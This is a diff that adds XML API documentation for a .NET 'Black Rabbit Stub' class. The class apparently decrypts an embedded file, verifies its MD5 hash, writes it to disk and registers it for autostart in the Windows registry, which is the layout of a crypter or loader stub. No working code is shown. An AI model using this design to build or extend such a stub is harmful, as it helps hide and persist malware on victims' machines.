@@ -1,0 +1,76 @@
+<?xml version="1.0"?>
+<doc>
+    <assembly>
+        <name>brstub</name>
+    </assembly>
+    <members>
+        <member name="T:brstub">
+            <summary>
+            Black Rabbit Stub Class
+            </summary>
+        </member>
+        <member name="M:brstub.GetMd5Hash(System.Byte[])">
+            <summary>
+            Generate MD5 hash.
+            </summary>
+            <param name="input">Byte array of data to hash</param>
+            <returns>Hash as string.</returns>
+        </member>
+        <member name="M:brstub.encrypt(System.Byte[])">
+            <summary>
+            Encrypt file with random key and IV.
+            </summary>
+            <param name="file">File as byte array.</param>
+            <returns>Returns tuple: Item1=encrypted file as byte array, Item2=key, Item3=IV </returns>
+        </member>
+        <member name="M:brstub.encrypt(System.Byte[],System.Byte[])">
+            <summary>
+            Encrypt file with user set key and random IV.
+            </summary>
+            <param name="file">File as byte array.</param>
+            <param name="IV">IV as byte array.</param>
+            <returns>Returns tuple: Item1=encrypted file as byte array, Item2=IV </returns>
+        </member>
+        <member name="M:brstub.encrypt(System.Byte[],System.Byte[],System.Byte[])">
+            <summary>
+            Encrypt file with user set key and IV
+            </summary>
+            <param name="file">>File as byte array.</param>
+            <param name="key">Key as byte array.</param>
+            <param name="IV">IV as byte array.</param>
+            <returns></returns>
+        </member>
+        <member name="M:brstub.decrypt(System.Byte[],System.Byte[],System.Byte[])">
+            <summary>
+            Decrypt file.
+            </summary>
+            <param name="encFile">Encrypted file as byte array.</param>
+            <param name="key">Key as byte array.</param>
+            <param name="IV">IV as byte array.</param>
+            <returns>Byte array of decrypted file.</returns>
+        </member>
+        <member name="M:brstub.checkMD5(System.String)">
+            <summary>
+            Check's decrypted file is correct.
+            </summary>
+            <param name="hashMD5">This is hash require to compare with decrypted file hash.</param>
+            <returns>Return true if hashes are  same, false if hashes are different.</returns>
+        </member>
+        <member name="M:brstub.saveFile(System.String)">
+            <summary>
+            Save decrypted array to file
+            </summary>
+            <param name="path">Path to save file</param>
+            <returns>Return true if file's exist ,false if isn't exist.</returns>
+        </member>
+        <member name="M:brstub.addToReg(System.String,System.String,brstub.regKeyType)">
+            <summary>
+            Add seved file to autostart register.
+            </summary>
+            <param name="appName">App name in name field in register.</param>
+            <param name="path">Path to file to autostart.</param>
+            <param name="regKey">Switcher between CurrentUser key and LocalMachine key(administrator required). </param>
+            <returns>True if register is set or false if error.</returns>
+        </member>
+    </members>
+</doc>
